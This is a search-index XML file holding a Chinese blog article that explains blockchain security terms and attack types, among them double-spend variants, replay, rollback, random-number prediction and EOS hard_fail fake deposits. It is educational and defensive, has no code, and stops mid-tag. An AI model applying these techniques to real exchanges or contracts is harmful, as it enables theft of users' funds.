<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BlockChain Security</title>
      <link href="/2020/05/23/qu-kuai-lian-gong-ji-fang-shi/"/>
      <url>/2020/05/23/qu-kuai-lian-gong-ji-fang-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要介绍一些与区块链安全相关的网络攻击知识，旨在让新手们更快适应区块链危机四伏的安全攻防世界。</p></blockquote><h1 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h1><h2 id="钱包-Wallet"><a href="#钱包-Wallet" class="headerlink" title="钱包 Wallet"></a>钱包 Wallet</h2><p>钱包(Wallet)是一个管理私钥的工具，数字货币钱包形式多样，但它通常包含一个软件客户端，允许使用者通过钱包检查、存储、交易其持有的数字货币。它是进入区块链世界的基础设施和重要入口。</p><p>据 SlowMist Hacked 统计，仅 2018 年因“钓鱼”、“第三方劫持”等原因所造成的钱包被黑损失总金额就达 69,160,985 美元，深究根本，除了部分钱包本身对攻击防御的不全面之外，最主要的是钱包持有者们的安全防范意识不强。</p><h2 id="冷钱包-Cold-Wallet"><a href="#冷钱包-Cold-Wallet" class="headerlink" title="冷钱包 Cold Wallet"></a>冷钱包 Cold Wallet</h2><p>冷钱包(Cold Wallet)是一种脱离网络连接的离线钱包，将数字货币进行离线储存的钱包。使用者在一台离线的钱包上面生成数字货币地址和私钥，再将其保存起来。冷钱包是在不需要任何网络的情况下进行数字货币的储存，因此黑客是很难进入钱包获得私钥的，但它也不是绝对安全的，随机数不安全也会导致这个冷钱包不安全，此外硬件损坏、丢失也有可能造成数字货币的损失，因此需要做好密钥的备份。</p><h2 id="热钱包-Hot-Wallet"><a href="#热钱包-Hot-Wallet" class="headerlink" title="热钱包 Hot Wallet"></a>热钱包 Hot Wallet</h2><p>热钱包(Hot Wallet)是一种需要网络连接的在线钱包，在使用上更加方便。但由于热钱包一般需要在线使用，个人的电子设备有可能因误点钓鱼网站被黑客盗取钱包文件、捕获钱包密码或是破解加密私钥，而部分中心化管理钱包也并非绝对安全。因此在使用中心化交易所或钱包时，最好在不同平台设置不同密码，且开启二次认证，以确保自己的资产安全。</p><h2 id="公钥-Public-Key"><a href="#公钥-Public-Key" class="headerlink" title="公钥 Public Key"></a>公钥 Public Key</h2><p>公钥(Public Key)是和私钥成对出现的，和私钥一起组成一个密钥对，保存在钱包中。公钥由私钥生成，但是无法通过公钥倒推得到私钥。公钥能够通过一系列算法运算得到钱包的地址，因此可以作为拥有这个钱包地址的凭证。</p><h2 id="私钥-Private-Key"><a href="#私钥-Private-Key" class="headerlink" title="私钥 Private Key"></a>私钥 Private Key</h2><p>私钥(Private Key)是一串由随机算法生成的数据，它可以通过非对称加密算法算出公钥，公钥可以再算出币的地址。私钥是非常重要的，作为密码，除了地址的所有者之外，都被隐藏。区块链资产实际在区块链上，所有者实际只拥有私钥，并通过私钥对区块链的资产拥有绝对控制权，因此，区块链资产安全的核心问题在于私钥的存储，拥有者需做好安全保管。</p><p>和传统的用户名、密码形式相比，使用公钥和私钥交易最大的优点在于提高了数据传递的安全性和完整性，因为两者——对应的关系，用户基本不用担心数据在传递过程中被黑客中途截取或修改的可能性。同时，也因为私钥加密必须由它生成的公钥解密，发送者也不用担心数据被他人伪造。</p><h2 id="助记词-Mnemonic"><a href="#助记词-Mnemonic" class="headerlink" title="助记词 Mnemonic"></a>助记词 Mnemonic</h2><p>由于私钥是一长串毫无意义的字符，比较难以记忆，因此出现了助记词(Mnemonic)。助记词是利用固定算法，将私钥转换成十多个常见的英文单词。助记词和私钥是互通的，可以相互转换，它只是作为区块链数字钱包私钥的友好格式。所以在此强调：助记词即私钥！由于它的明文性，不建议它以电子方式保存，而是抄写在物理介质上保管好，它和 Keystore 作为双重备份互为补充。</p><h2 id="Keystone"><a href="#Keystone" class="headerlink" title="Keystone"></a>Keystone</h2><p>Keystore 主要在以太坊钱包 App 中比较常见(比特币类似以太坊 Keystore 机制的是：BIP38)，是把私钥通过钱包密码再加密得来的，与助记词不同，一般可保存为文本或 JSON 格式存储。换句话说，Keystore 需要用钱包密码解密后才等同于私钥。因此，Keystore 需要配合钱包密码来使用，才能导入钱包。当黑客盗取 Keystore 后，在没有密码情况下, 有可能通过暴力破解 Keystore 密码解开 Keystore，所以建议使用者在设置密码时稍微复杂些，比如带上特殊字符，至少 8 位以上，并安全存储。</p><hr><h1 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h1><h2 id="公链-Public-Blockchain"><a href="#公链-Public-Blockchain" class="headerlink" title="公链 Public Blockchain"></a>公链 Public Blockchain</h2><p>公有链(Public Blockchain)简称公链，是指全世界任何人都可随时进入读取、任何人都能发送交易且能获得有效确认的共识区块链。公链通常被认为是完全去中心化的，链上数据都是公开透明的，不可更改，任何人都可以通过交易或挖矿读取和写入数据。一般会通过代币机制(Token)来鼓励参与者竞争记账，来确保数据的安全性。</p><p>由于要检测所有的公链的工作量非常大，只靠一家公司不可能监测整个区块链生态安全问题，这就导致了黑客极有可能在众多公链之中找寻到漏洞进行攻击。2017 年 4 月 1 日，Stellar 出现通胀漏洞，一名攻击者利用此漏洞制造了 22.5 亿的 Stellar 加密货币 XLM，当时价值约 1000 万美元。</p><h2 id="交易所-Exchange"><a href="#交易所-Exchange" class="headerlink" title="交易所 Exchange"></a>交易所 Exchange</h2><p>与买卖股票的证券交易所类似，区块链交易所即数字货币买卖交易的平台。数字货币交易所又分为中心化交易所和去中心化交易所。</p><p><strong>去中心化交易所：</strong>交易行为直接发生在区块链上，数字货币会直接发回使用者的钱包，或是保存在区块链上的智能合约。这样直接在链上交易的好处在于交易所不会持有用户大量的数字货币，所有的数字货币会储存在用户的钱包或平台的智能合约上。去中心化交易通过技术手段在信任层面去中心化，也可以说是无需信任，每笔交易都通过区块链进行公开透明，不负责保管用户的资产和私钥等信息，用户资金的所有权完全在自己手上，具有非常好的个人数据安全和隐私性。目前市面上的去中心化交易所有 WhaleEx、Bancor、dYdX 等</p><p><strong>中心化交易所：</strong>目前热门的交易所大多都是采用中心化技术的交易所，使用者通常是到平台上注册，并经过一连串的身份认证程序(KYC)后，就可以开始在上面交易数字货币。用户在使用中心化交易所时，其货币交换不见得会发生在区块链上，取而代之的可能仅是修改交易所数据库内的资产数字，用户看到的只是账面上数字的变化，交易所只要在用户提款时准备充足的数字货币可供汇出即可。当前的主流交易大部分是在中心化交易所内完成的，目前市面上的中心化交易所有币安，火币，OKEx 等。</p><p>由于交易所作为连接区块链世界和现实世界的枢纽，储存了大量数字货币，它非常容易成为黑客们觊觎的目标，截止目前全球数字货币交易所因安全问题而遭受损失金额已超过 29 亿美元(数据来源 SlowMist Hacked)。</p><h2 id="节点Node"><a href="#节点Node" class="headerlink" title="节点Node"></a>节点Node</h2><p>在传统互联网领域，企业所有的数据运行都集中在一个中心化的服务器中，那么这个服务器就是一个节点。由于区块链是去中心化的分布式数据库，是由千千万万个“小服务器”组成。区块链网络中的每一个节点，就相当于存储所有区块数据的每一台电脑或者服务器。所有新区块的生产，以及交易的验证与记帐，并将其广播给全网同步，都由节点来完成。节点分为“全节点”和“轻节点”，全节点就是拥有全网所有的交易数据的节点，那么轻节点就是只拥有和自己相关的交易数据节点。由于每一个全节点都保留着全网数据，这意味着，其中一个节点出现问题，整个区块链网络世界也依旧能够安全运行，这也是去中心化的魅力所在。</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>远程过程调用(Remote Procedure Call，缩写为 RPC)是一个计算机通信协议。以太坊 RPC 接口是以太坊节点与其他系统交互的窗口，以太坊提供了各种 RPC 调用：HTTP、IPC、WebSocket 等等。在以太坊源码中，server.go 是核心逻辑，负责 API 服务的注入，以及请求处理、返回。http.go 实现 HTTP 的调用，websocket.go 实现 WebSocket 的调用，ipc.go 实现 IPC 的调用。以太坊节点默认在 8545 端口提供了 JSON RPC 接口，数据传输采用 JSON 格式，可以执行 Web3 库的各种命令，可以向前端（例如 imToken、Mist 等钱包客户端）提供区块链上的信息。</p><hr><h1 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h1><h2 id="共识-Consensus"><a href="#共识-Consensus" class="headerlink" title="共识 Consensus"></a>共识 Consensus</h2><p>共识算法主要是解决分布式系统中，多个节点之间对某个状态达成一致性结果的问题。分布式系统由多个服务节点共同完成对事物的处理，分布式系统中多个副本对外呈现的数据状态需要保持一致性。由于节点的不可靠性和节点间通讯的不稳定性，甚至节点作恶，伪造信息，使得节点之间出现数据状态不一致的问题。通过共识计算，可以将多个不可靠的单独节点组建成一个可靠的分布式系统，实现数据状态的一致性，提高系统的可靠性。</p><p>区块链系统本身作为一个超大规模的分布式系统，但又与传统的分布式系统存在明显区别。由于它不依赖于任何一个中央权威，系统建立在去中心化的点对点网络基础之上，因此分散的节点需要就交易的有效与否达成一致，这就是共识算法发挥作用的地方，即确保所有节点都遵守协议规则并保证所有交易都以可靠的方式进行。由共识算法实现在分散的节点间对交易的处理顺序达成一致，这是共识算法在区块链系统中起到的最主要作用。</p><p>区块链系统中的共识算法还承担着区块链系统中激励模型和治理模型中的部分功能，为了解决在对等网络中(P2P),相互独立的节点如何达成一项决议问题的过程。简而言之，共识算法是在解决分布式系统中如何保持一致性的问题。</p><h2 id="工作量证明PoW-Proof-of-Work"><a href="#工作量证明PoW-Proof-of-Work" class="headerlink" title="工作量证明PoW(Proof of Work)"></a>工作量证明PoW(Proof of Work)</h2><p>PoW(Proof of Work)是历史上第一个成功的去中心化区块链共识算法。工作量证明是大多数人所熟悉的，被比特币、以太坊，莱特币等主流公链广泛使用。</p><p>工作量证明要求节点参与者执行计算密集型的任务，但是对于其他网络参与者来说易于验证。在比特币的例子中，矿工竞相向由整个网络维护的区块链账本中添加所收集到的交易，即区块。为了做到这一点，矿工必须第一个准确计算出“nonce”，这是一个添加在字符串末尾的数字，用来创建一个满足开头特定个数为零的哈希值。不过存在采矿的大量电力消耗和低交易吞吐量等缺点。</p><h2 id="权益证明-PoS-Proof-of-Stake"><a href="#权益证明-PoS-Proof-of-Stake" class="headerlink" title="权益证明 PoS(Proof of Stake)"></a>权益证明 PoS(Proof of Stake)</h2><p>PoS(Proof of Stake)——权益证明机制，一种主流的区块链共识算法，目的是为了让区块链里的分布式节点达成共识，它往往和工作量证明机制(Proof of Work)一起出现，两种都被认为是区块链共识算法里面的主流算法之一。作为一种算法，它通过持币人的同意来达成共识，目的是确定出新区块，这过程相对于 PoW，不需要硬件和电力，且效率更高。</p><p>PoS 共识中引入了 Stake 的概念，持币人将代币进行 Staking，要求所有的参与者抵押一部分他们所拥有的 Token 来验证交易，然后获得出块的机会，PoS 共识中会通过选举算法，按照持币量比例以及 Token 抵押时长，或者是一些其他的方式，选出打包区块的矿工。矿工在指定高度完成打包交易，生成新区块，并广播区块，广播的区块经过 PoS 共识中另外一道”门槛”，验证人验证交易，通过验证后，区块得到确认。这样一轮 PoS 的共识过程就进行完成了。权益证明通过长期绑定验证者的利益和整个网络的利益来阻止不良行为。锁定代币后，如果验证者存在欺诈性交易，那么他们所抵押的 Token 也会被削减。</p><h2 id="委托权益证明-DPoS-Delegate-Proof-of-Stake"><a href="#委托权益证明-DPoS-Delegate-Proof-of-Stake" class="headerlink" title="委托权益证明 DPoS(Delegate Proof of Stake)"></a>委托权益证明 DPoS(Delegate Proof of Stake)</h2><p>委托权益证明，其雏形诞生在 2013 年 12 月 8 日，Daniel Larimer 在 bitsharetalk 首次谈及用投票选择出块人的方式，代替 PoS 中可能出现的选举随机数被操纵的问题。在 DPoS 中，让每一个持币者都可以进行投票，由此产生一定数量的代表 ,或者理解为一定数量的节点或矿池，他们彼此之间的权利是完全相等的。持币者可以随时通过投票更换这些代表，以维系链上系统的“长久纯洁性”。在某种程度上，这很像是国家治理里面的代议制，或者说是人大代表制度。这种制度最大的好处就是解决了验证人过多导致的效率低下问题，当然，这种制度也有很明显的缺点，由于 “代表”制度，导致其一直饱受中心化诟病。</p><h2 id="恶意挖矿攻击-Cryptojacking-Attack"><a href="#恶意挖矿攻击-Cryptojacking-Attack" class="headerlink" title="恶意挖矿攻击 Cryptojacking Attack"></a>恶意挖矿攻击 Cryptojacking Attack</h2><p>恶意挖矿攻击(Cryptojacking)是一种恶意行为，指未经授权的情况下劫持用户设备挖掘加密货币。通常，攻击者会劫持受害者设备(个人 PC 或服务器)的处理能力和带宽，由于加密货币挖掘需要大量算力，攻击者会尝试同时感染多个设备，这样他们能够收集到足够的算力来执行这种低风险和低成本的挖矿活动。</p><p>一般恶意挖矿软件会诱导用户在计算机上加载挖矿代码，或通过使用类似网络钓鱼的方法，如恶意链接、电子邮件或是在网站里植入挖矿脚本等方式，使系统无意中被隐藏的加密挖矿程序感染进而完成攻击行为。近年来，随着加密货币价格的上涨，更加复杂的恶意软件被开发出来，使恶意挖矿攻击事件层出不穷。</p><h2 id="无利益攻击-Nothing-at-Stake-Attack"><a href="#无利益攻击-Nothing-at-Stake-Attack" class="headerlink" title="无利益攻击 Nothing at Stake Attack"></a>无利益攻击 Nothing at Stake Attack</h2><p>无利益攻击(Nothing at Stake Attack)，是在 PoS 共识机制下一个有待解决的问题，其问题的本质可以简单概括为“作恶无成本，好处无限多”。</p><p>当 PoS 共识系统出现分叉(Fork)时，出块节点可以在“不受任何损失”的前提下，同时在两个分叉上出块；无论哪一个分叉后面被公认为主链，该节点都可以获得“所有收益”且不会有任何成本损失。这就很容易给某些节点一种动力去产生新的分叉，支持或发起不合法交易，其他逐利的出块节点会同时在多条链(窗口)上排队出块支持新的分叉。随着时间的推移，分叉越来越多，非法交易，作恶猖狂。区块链将不再是唯一链，所有出块节点没有办法达成共识。</p><p>为了预防这样的情况发生，许多类 PoS 共识机制对此的解决方法是引入惩罚机制，对作恶的节点进行经济惩罚(Slashing)，以建立更加稳定的网络。DPoS 实际上也是无利益攻击的解决方案之一，由上文我们可知 DPoS 这个机制由持币人选出出块节点来运营网络，出块节点会将一部分奖励分给投票者。</p><hr><h1 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h1><h2 id="多签Multi-sig"><a href="#多签Multi-sig" class="headerlink" title="多签Multi-sig"></a>多签Multi-sig</h2><p>多签(Multi-sig)指的是需要多个签名才能执行的操作(这些签名是不同私钥生成的)。这可用于提供更高的安全性，即使丢失单个私钥的话也不会让攻击者取得账户的权限，多个值得信赖的各方必须同时批准更新，否则无效。</p><p>我们都知道，一般来说一个比特币地址对应一个私钥，动用这个地址中的资金需要私钥的持有者发起签名才行。而多重签名技术，简单来说，就是动用一笔资金时需要多个私钥签名才有效。多签的一个优势就是可以多方对一笔付款一起达成共识，才能支付成功。</p><h2 id="双花攻击-Double-Spend-Attack"><a href="#双花攻击-Double-Spend-Attack" class="headerlink" title="双花攻击 Double Spend Attack"></a>双花攻击 Double Spend Attack</h2><p>双花攻击(Double Spend Attack)即一笔钱花了两次，双重支付，利用货币的数字特性两次或多次使用“同一笔钱”完成支付。双花不会产生新的 Token，但能把自己花出去的钱重新拿回来。简单说就是，攻击者将一笔 Token 转到另外一个地址，通常是转到交易所进行套现，然后再利用一些攻击手法对转账交易进行回滚。目前有常见的几种手法能够引发双花攻击：</p><h3 id="1-Race-Attack"><a href="#1-Race-Attack" class="headerlink" title="1.Race Attack"></a>1.Race Attack</h3><p>这种攻击主要通过控制矿工费来实现双花。攻击者同时向网络中发送两笔交易，一笔交易发给自己(为了提高攻击成功的概率，他给这笔交易增加了足够的矿工费)，一笔交易发给商家。由于发送给自己的交易中含有较高的手续费，会被矿工优先打包进区块的概率比较高。这时候这笔交易就会先于发给商家的那笔交易，那么发给商家的交易就会被回滚。对于攻击者来说，通过控制矿工费，就实现了同一笔 Token 的“双花”。</p><h3 id="2-Finney-Attack"><a href="#2-Finney-Attack" class="headerlink" title="2.Finney Attack"></a>2.Finney Attack</h3><p>攻击者主要通过控制区块的广播时间来实现双花，攻击对象针对的是接受 0 确认的商家。假设攻击者挖到区块，该区块中包含着一个交易，即 A 向 B 转了一定数量的 Token，其中 A 和 B 都是攻击者的地址。但是攻击者并不广播这个区块，而是立即找到一个愿意接受 0 确认交易的商家向他购买一个物品，向商家发一笔交易，用 A 向商家的地址 C 支付，发给商家的交易广播出去后，攻击者再把自己之前挖到的区块广播出去，由于发给自己的交易先于发给商家的交易，对于攻击者来说，通过控制区块的广播时间，就实现了同一笔 Token 的“双花”。</p><h3 id="3-Vector76-Attack"><a href="#3-Vector76-Attack" class="headerlink" title="3.Vector76 Attack"></a>3.Vector76 Attack</h3><p>Vector76 Attack 又称“一次确认攻击”，也就是交易确认一次后仍然可以回滚，是 Finney Attack 和 Race Attack 的组合。</p><p>攻击者创建两个节点，节点 A 连接到商家节点，节点 B 连接到区块链网络中的其他节点。接着，攻击者用同一笔 Token 发起两笔交易，一笔交易发送给商家地址，我们称为交易 1；一笔交易发送给自己的钱包地址，我们称为交易 2。与上面说的 Race Attack 一样，攻击者对交易 2 添加了较高的矿工费从而提高了矿工的打包概率，此时，攻击者并没有把这两笔交易广播到网络中去。</p><p>接着，攻击者开始在交易 1 所在的分支上进行挖矿，这条分支我们命名为分支 1。攻击者挖到区块后，并没有广播出去，而是同时做了两件事：在节点 A 上发送交易 1，在节点 B 上发送交易 2。</p><p>由于节点 A 只连接了商家节点，所以当商家节点想把交易 1 传给其它对等节点时，连接了更多节点的节点 B，已经把交易 2 广播给了网络中的大部分节点。于是，从概率上来讲，交易 2 就更有可能被网络认定为是有效的，交易 1 被认定为无效。</p><p>交易 2 被认为有效后，攻击者立即把自己之前在分支 1 上挖到的区块，广播到网络中。这时候，这个接受一次确认就支付的商家，会确认交易成功，然后攻击者就可以立即变现并转移资产。</p><p>同时，由于分支 2 连接的更多节点，所以矿工在这个分支上挖出了另一个区块，也就是分支 2 的链长大于分支 1 的链长。于是，分支 1 上的交易就会回滚，商家之前支付给攻击者的交易信息就会被清除，但是攻击者早已经取款，实现了双花。</p><h3 id="4-51-Attack"><a href="#4-51-Attack" class="headerlink" title="4.51% Attack"></a>4.51% Attack</h3><p>目前已知公链安全实践的攻击手法多为51%攻击，攻击者占有超过全网 50% 的算力，在攻击者控制算力的这段时间，他可以创造一条高度大于原来链的新链。那么旧链中的交易会被回滚，攻击者可以使用同一笔 Token 发送一笔新的交易到新链上。</p><h2 id="软分叉-Soft-fork"><a href="#软分叉-Soft-fork" class="headerlink" title="软分叉 Soft-fork"></a>软分叉 Soft-fork</h2><p>软分叉(Soft-fork)更多情况下是一种协议升级，当新共识规则发布后，没有升级的旧节点并不会意识到代码已经发生改变，而继续生产不合法的区块，就会产生临时性分叉，但新节点可以兼容旧节点，即新旧节点始终在同一条链上工作。</p><h2 id="硬分叉-Hard-fork"><a href="#硬分叉-Hard-fork" class="headerlink" title="硬分叉 Hard-fork"></a>硬分叉 Hard-fork</h2><p>硬分叉(Hard-fork)是区块链发生永久性分歧，在新共识规则发布后，已经升级的节点无法验证未升级节点产生的区块，未升级节点也无法验证已经升级的节点产生的区块，即新旧节点互不兼容，通常硬分叉就会发生，原有正常的一条链被分成了两条链（已升级的一条链和未升级的一条链，且这两条链互不兼容）。</p><p>历史上比较著名的硬分叉事件是 The DAO 事件，作为以太坊上的一个著名项目，由于智能合约的漏洞造成资金被黑客转移，黑客盗取了当时价值约 6000 万美元的 ETH，让这个项目蒙受了巨大的损失。为了弥补这个损失，2016 年 7 月，以太坊团队修改了以太坊合约代码实行硬分叉，在第 1920000 个区块强行把 The DAO 及其子 DAO 的所有资金全部转到一个特定的退款合约地址，进而“夺回”了黑客所控制 DAO 合约上的币。但这个修改被一部分矿工所拒绝，因而形成了两条链，一条为原链(以太坊经典，ETC)，一条为新的分叉链(ETH)，他们各自代表了不同社区的共识和价值观。</p><hr><h1 id="Part5"><a href="#Part5" class="headerlink" title="Part5"></a>Part5</h1><h2 id="异性攻击-Alien-Attack"><a href="#异性攻击-Alien-Attack" class="headerlink" title="异性攻击 Alien Attack"></a>异性攻击 Alien Attack</h2><p>异形攻击(Alien Attack)实际上是一个所有公链都可能面临的问题，又称地址池污染，是指诱使同类链的节点互相侵入和污染的一种攻击手法，漏洞的主要原因是同类链系统在通信协议上没有对不同链的节点做识别。</p><p>这种攻击在一些参考以太坊通信协议实现的公链上得到了复现：以太坊同类链，由于使用了兼容的握手协议，无法区分节点是否属于同个链，利用这一点，攻击者先对以太坊节点地址进行收集并进行恶意握手操作，通过跟节点握手达成污染地址池的目的，使得不同链的节点互相握手并把各自地址池里已知的节点推送给了对方，导致更多的节点互相污染，最终扩散致整个网络。遭受异形攻击的节点通常会通信性能下降，最终造成节点阻塞、主网异常等现象。相关公链需要注意持续保持主网健康状态监测，以免出现影响主网稳定的攻击事件出现。</p><h2 id="钓鱼攻击Phishing"><a href="#钓鱼攻击Phishing" class="headerlink" title="钓鱼攻击Phishing"></a>钓鱼攻击Phishing</h2><p>所谓“钓鱼攻击(Phishing)”，指的是攻击者伪装成可以信任的人或机构，通过电子邮件、通讯软件、社交媒体等方式，以获取收件人的用户名、密码、私钥等私密信息。随着技术的发展，网络钓鱼攻击不仅可以托管各种恶意软件和勒索软件攻击，而且更糟糕的是这些攻击正在呈现不断上升的趋势。</p><p>2018 年 2 月 19 日，乌克兰的一个黑客组织，通过购买谷歌搜索引擎中与加密货币相关的关键词广告，伪装成合法网站的恶意网站链接，从知名加密货币钱包 Blockchain.info 中窃取了价值超过 5000 万美元的数字加密货币。而除了上述这种域名钓鱼攻击(即使用与官网相似的网址)外，其他类型的钓鱼攻击包括邮件钓鱼攻击、Twitter 1 for 10（支付 0.5-10ETH 返利 5-100ETH）、假 App 和假工作人员等。2019 年 6 月份，就有攻击者向多家交易所发送敲诈勒索信息，通过邮件钓鱼攻击获取了超 40 万美元的收益。</p><h2 id="木马攻击-Trojan-Horse-Attack"><a href="#木马攻击-Trojan-Horse-Attack" class="headerlink" title="木马攻击 Trojan Horse Attack"></a>木马攻击 Trojan Horse Attack</h2><p>木马攻击(Trojan Horse Attack)是指攻击者通过隐藏在正常程序中的一段具有特殊功能的恶意代码，如具备破坏和删除文件、发送密码、记录键盘和 DDoS 攻击等特殊功能的后门程序，将控制程序寄生于被控制的计算机系统中，里应外合，对被感染木马病毒的计算机实施操作。可用来窃取用户个人信息，甚至是远程控制对方的计算机而加壳制作，然后通过各种手段传播或者骗取目标用户执行该程序，以达到盗取密码等各种数据资料等目的。</p><p>在区块链领域，诸如勒索木马、恶意挖矿木马一直是行业内令人头疼的安全顽疾，据币世界报道，随着比特币的飙升，推动整个数字加密货币价格回升，与币市密切相关的挖矿木马开始新一轮活跃，仅 2019 年上半年挖矿木马日均新增 6 万个样本，通过分析发现某些新的挖矿木马家族出现了快速、持续更新版本的现象，其功能设计越来越复杂，在隐藏手法、攻击手法方面不断创新，与杀软厂商的技术对抗正在不断增强。</p><h2 id="供应链攻击-Supply-Chain-Attack"><a href="#供应链攻击-Supply-Chain-Attack" class="headerlink" title="供应链攻击 Supply Chain Attack"></a>供应链攻击 Supply Chain Attack</h2><p>供应链攻击(Supply Chain Attack)是一种非常可怕的攻击方式，防御上很难做到完美规避，由于现在的软件工程，各种包/模块的依赖十分频繁、常见，而开发者们很难做到一一检查，默认都过于信任市面上流通的包管理器，这就导致了供应链攻击几乎已经成为必选攻击之一。把这种攻击称成为供应链攻击，是为了形象说明这种攻击是一种依赖关系，一个链条，任意环节被感染都会导致链条之后的所有环节出问题。</p><p>供应链攻击形式多样，它可能出现在任何环节。2018 年 11 月，Bitpay 旗下 Copay 遭遇供应链攻击事件，攻击者的攻击行为隐匿了两个月之久。攻击者通过污染 EvenStream(NPM 包)并在后门中留下针对 Copay 的相关变量数值，对 Copay 发起定向攻击从而窃取用户的私钥信息。而就在2019 年 6 月 4 日，NPM Inc 安全团队刚与 Komodo 联手成功挫败了一起典型的供应链攻击，保护了超过 1300 万美元的数字加密货币资产，攻击者将恶意程序包放入 Agama 的构建链中，通过这种手段来窃取钱包应用程序中使用的钱包私钥和其他登录密码。</p><p>供应链攻击防不胜防且不计代价，慢雾安全团队建议所有数字加密货币相关项目(如交易所、钱包、DApp 等)都应该强制至少一名核心技术完整审查一遍所有第三方模块，看看是否存在可疑代码，也可以通过抓包查看是否存在可疑请求。</p><hr><h1 id="Part6"><a href="#Part6" class="headerlink" title="Part6"></a>Part6</h1><h2 id="智能合约-Smart-Contract"><a href="#智能合约-Smart-Contract" class="headerlink" title="智能合约 Smart Contract"></a>智能合约 Smart Contract</h2><p>智能合约(Smart Contract)并不是一个新的概念，早在 1995 年就由跨领域法律学者 Nick Szabo 提出：智能合约是一套以数字形式定义的承诺(Promises)，包括合约参与方可以在上面执行这些承诺的协议。在区块链领域中，智能合约本质可以说是一段运行在区块链网络中的代码，它以计算机指令的方式实现了传统合约的自动化处理，完成用户所赋予的业务逻辑。</p><p>随着区块链智能合约数量的与日俱增，随之暴露出来的安全问题也越来越多，攻击者常能利用漏洞入侵系统对智能合约用户造成巨大损失，据 SlowMist Hacked 统计，截止目前仅 ETH、EOS、TRON 三条链上因智能合约被攻击而导致的损失就高达 ＄126,883,725.92，具有相同攻击特征的手法更是呈现出多次得手且跨公链的趋势，接下来我们将为大家介绍近年来一些常见的智能合约攻击手法。</p><h2 id="交易回滚攻击-Roll-Back-Attack"><a href="#交易回滚攻击-Roll-Back-Attack" class="headerlink" title="交易回滚攻击 Roll Back Attack"></a>交易回滚攻击 Roll Back Attack</h2><p>交易回滚攻击(Roll Back Attack)，故名思义，指的是能对交易的状态进行回滚。回滚具体是什么意思呢？回滚具体指的是将已经发生的状态恢复成它未发生时候的样子。那么，交易回滚的意思就是将已经发生的交易变成未发生的状态。即攻击者本来已经发生了支付动作，但是通过某些手段，让转账流程发生错误，从而回滚整个交易流程，达到交易回滚的目的，这种攻击手法多发于区块链上的的智能合约游戏当中，当用户的下注动作和合约的开奖动作在一个交易内的时候，即内联交易。攻击者就可以通过交易发生时检测智能合约的某些状态，获知开奖信息，根据开奖信息选择是否对下注交易进行回滚。</p><h2 id="交易排挤攻击-Transaction-Congestion-Attack"><a href="#交易排挤攻击-Transaction-Congestion-Attack" class="headerlink" title="交易排挤攻击 Transaction Congestion Attack"></a>交易排挤攻击 Transaction Congestion Attack</h2><p>交易排挤攻击(Transaction Congestion Attack)是针对 EOS 上的使用 defer 进行开奖的游戏合约的一种攻击手法，攻击者可以通过某些手段，在游戏合约的 defer 开奖交易前发送大量的 defer 交易，恶意侵占区块内的 CPU 资源，使得智能合约内本应在指定区块内执行的 defer 开奖交易因资源不足无法执行，只能去到下一个区块才执行。由于很多 EOS 上的游戏智能合约使用区块信息作为智能合约本身的随机数，同一个 defer 开奖交易在不同区块内的执行结果是不一样的。通过这样的方式，攻击者在获知无法中奖的时候，就通过发送大量的 defer 交易，强行让智能合约重新开奖，从而达到攻击目的。</p><p>该攻击手法最早在黑客 loveforlover 向 EOS.WIN 发起攻击时被发现，随后相同的攻击手法多次得手，据 SlowMist Hacked 统计仅 2019 年就有 22 个竞猜类 DApp 因此损失了大量资金。</p><h2 id="随机数攻击-Random-Number-Attack"><a href="#随机数攻击-Random-Number-Attack" class="headerlink" title="随机数攻击 Random Number Attack"></a>随机数攻击 Random Number Attack</h2><p>随机数攻击(Random Number Attack)，就是针对智能合约的随机数生成算法进行攻击，预测智能合约的随机数。目前区块链上很多游戏都是采用的链上信息（如区块时间，未来区块哈希等）作为游戏合约的随机数源，也称随机数种子。使用这种随机数种子生成的随机数被称为伪随机数。伪随机数不是真的随机数，存在被预测的可能。当使用可被预测的随机数种子生成随机数的时候，一旦随机数生成的算法被攻击者猜测到或通过逆向等其他方式拿到，攻击者就可以根据随机数的生成算法预测游戏即将出现的随机数，实现随机数预测，达到攻击目的。</p><hr><h1 id="Part7"><a href="#Part7" class="headerlink" title="Part7"></a>Part7</h1><h2 id="hard-fail-状态攻击-hard-fail-Attack"><a href="#hard-fail-状态攻击-hard-fail-Attack" class="headerlink" title="hard_fail 状态攻击 hard_fail Attack"></a>hard_fail 状态攻击 hard_fail Attack</h2><p>hard_fail 是什么呢？简单来说就是出现错误但是没有使用错误处理器(error handler)处理错误，比方说使用 onerror 捕获处理，如果说没有 onerror 捕获，就会 hard_fail。EOS 上的交易状态记录分为 executed, soft_fail, hard_fail, delayed 和 expired 这 5 种状态，通常在链上大部分人观察到的交易，都是 executed 的，或者 delayed 的，而没有失败的交易，这就导致大部分开发者误以为 EOS 链上没有失败的交易记录，从而忽略了对交易状态的检查。攻击者利用这个细节，针对链上游戏或交易所进行攻击，构造执行状态为 hard_fail 的交易，欺骗链上游戏或交易所进行假充值攻击，从而获利。</p><h2 id="重放攻击-Replay-Attack"><a href="#重放攻击-Replay-Attack" class="headerlink" title="重放攻击 Replay Attack"></a>重放攻击 Replay Attack</h2><p>重放攻击(Replay Attack)，是针对区块链上的交易信息进行重放，一般来说，区块链为了保证不可篡改和防止双花攻击的发生，会对交易进行各种验证，包括交易的时间戳，nonce，交易 id 等，但是随着各种去中心化交易所的兴起，在智能合约中验证用户交易的场景越来越多。这种场景一般是需要用户对某一条消息进行签名后上传给智能合约，然后在合约内部进行验签。但由于用户的签名信息是会上链的，也就是说每个人都能拿到用户的签名信息，当在合约中校验用户签名的时候，如果被签名的消息不存在随着交易次数变化的变量，如时间戳，nonce 等，攻击者就可以拿着用户的签名，伪造用户发起交易，从而获利。</p><p>这是一种最早出现于 DApp 生态初期的攻击形态，由于开发者设计的开奖随机算法存在严重缺陷，使得攻击者可利用合约漏洞重复开奖，属于开发者较为容易忽略的错误。因此，开发者们在链上进行验签操作的时候，需要对被签名消息加上各种可变因子，防止攻击者对链上签名进行重放，造成资产损失。</p><h2 id="重入攻击-Reentrancy-Attack"><a href="#重入攻击-Reentrancy-Attack" 